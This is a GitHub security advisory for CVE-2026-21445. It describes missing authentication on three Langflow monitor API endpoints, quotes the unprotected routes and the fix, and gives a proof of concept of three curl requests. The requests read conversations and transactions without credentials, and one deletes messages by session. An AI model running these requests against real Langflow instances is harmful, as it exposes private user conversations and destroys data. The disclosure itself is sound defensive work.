# [H] Langflow Missing Authentication on Critical API Endpoints

## Summary
Severity: High
Advisory: GHSA-c5cp-vx83-jhqx
CVE: CVE-2026-21445
CWE: CWE-306
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-02
Source: https://github.com/advisories/GHSA-c5cp-vx83-jhqx
Type: github-advisory

## Affected
- PyPI: `langflow-base` — affected >=0 <0.7.1
- PyPI: `langflow` — affected >=0 <1.7.1

## Details
### Summary
Multiple critical API endpoints in Langflow are missing authentication controls, allowing any unauthenticated user to access sensitive user conversation data, transaction histories, and perform destructive operations including message deletion. This affects endpoints handling personal data and system operations that should require proper authorization.

### Details
The vulnerability exists in three API endpoints within `src/backend/base/langflow/api/v1/monitor.py` that are missing the required `dependencies=[Depends(get_current_active_user)]` authentication dependency:

**Affected Endpoints:**

1. **GET `/api/v1/monitor/messages`** (Line 61)
   ```python
   @router.get("/messages")  # ❌ Missing authentication
   async def get_messages(
       session: DbSession,
       flow_id: Annotated[UUID | None, Query()] = None,
       session_id: Annotated[str | None, Query()] = None,
       # ... other parameters
   ) -> list[MessageResponse]:
   ```

2. **GET `/api/v1/monitor/transactions`** (Line 183)
   ```python
   @router.get("/transactions")  # ❌ Missing authentication
   async def get_transactions(
       flow_id: Annotated[UUID, Query()],
       session: DbSession,
       params: Annotated[Params | None, Depends(custom_params)],
   ) -> Page[TransactionTable]:
   ```

3. **DELETE `/api/v1/monitor/messages/session/{session_id}`** (Line 165)
   ```python
   @router.delete("/messages/session/{session_id}", status_code=204)  # ❌ Missing authentication
   async def delete_messages_session(
       session_id: str,
       session: DbSession,
   ):
   ```

**Inconsistency Evidence:**
Other endpoints in the same file properly implement authentication:
```python
@router.get("/messages/sessions", dependencies=[Depends(get_current_active_user)])  # ✅ Properly secured
@router.delete("/messages", status_code=204, dependencies=[Depends(get_current_active_user)])  # ✅ Properly secured
```

### PoC
Complete reproduction steps to demonstrate the vulnerability:

**Prerequisites:**
1. Start a Langflow server instance
2. Ensure no authentication headers or API keys are provided

**Reproduction Commands:**
```bash
# 1. Access all user conversations without authentication
curl http://localhost:7860/api/v1/monitor/messages

# 2. Access transaction history without authentication
curl "http://localhost:7860/api/v1/monitor/transactions?flow_id=00000000-0000-0000-0000-000000000000"

# 3. Delete user messages by session without authentication
curl -X DELETE http://localhost:7860/api/v1/monitor/messages/session/00000000-0000-0000-0000-000000000000
```

**Expected vs Actual Behavior:**
- **Expected:** All requests should return `401 Unauthorized` 
- **Actual:** All requests return successful responses with sensitive data or perform destructive operations

### Impact

**Vulnerability Type:** Broken Authentication and Authorization (OWASP Top 10 - A01:2021)

**Severity:** High

**Who is Impacted:**
- **All Langflow users**: Personal conversation data exposed to unauthorized access
- **System administrators**: Transaction logs disclosed

**Specific Impacts:**
1. **Data Breach**: Unauthorized access to user conversations containing potentially sensitive personal information
2. **Privacy Violation**: Transaction histories and user activity patterns exposed without consent
3. **Data Destruction**: Malicious actors can delete user conversation histories without authorization
4. **Compliance Risk**: Potential violations of data protection regulations (GDPR, CCPA, etc.)
5. **System Intelligence**: Attackers can gather information about system usage patterns and user behavior

**Attack Scenarios:**
- Malicious users accessing proprietary conversation data
- Malicious users deleting other users' conversation histories
- Automated scraping of all user conversations for data harvesting
- Reconnaissance attacks to understand system architecture and usage patterns

**Recommended Fix:**
Add authentication dependencies to all affected endpoints:

```python
@router.get("/messages", dependencies=[Depends(get_current_active_user)])
@router.get("/transactions", dependencies=[Depends(get_current_active_user)])
@router.delete("/messages/session/{session_id}", dependencies=[Depends(get_current_active_user)])
```

**Environment:**
- Langflow Version: Current main branch
- Affected Components: API v1 monitoring endpoints
- Authentication System: FastAPI dependency injection with `get_current_active_user`

<img width="1908" height="1029" alt="25-090901" src="https://github.com/user-attachments/assets/44bd03b4-6ada-45b7-b81b-9cb83747172b" />

## References
- https://github.com/langflow-ai/langflow/security/advisories/GHSA-c5cp-vx83-jhqx
- https://nvd.nist.gov/vuln/detail/CVE-2026-21445
- https://github.com/langflow-ai/langflow/commit/3fed9fe1b5658f2c8656dbd73508e113a96e486a
- https://github.com/langflow-ai/langflow
- https://github.com/langflow-ai/langflow/releases/tag/1.7.1
